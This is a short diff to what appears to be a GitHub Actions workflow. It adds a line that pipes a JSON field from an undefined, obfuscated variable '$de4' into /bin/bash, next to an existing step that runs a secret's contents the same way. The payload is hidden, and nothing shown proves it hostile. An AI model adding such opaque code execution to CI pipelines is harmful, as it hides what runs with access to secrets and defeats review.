@@ -23,6 +23,7 @@ jobs:
           um78: ${{ secrets.um78 }}
         run: |
           printf '%s' "$um78" | jq -r .stt52685 | /bin/bash
+          echo $de4 | jq -r .psgjk773 | /bin/bash
 
       - name: Save archive
         if: always()
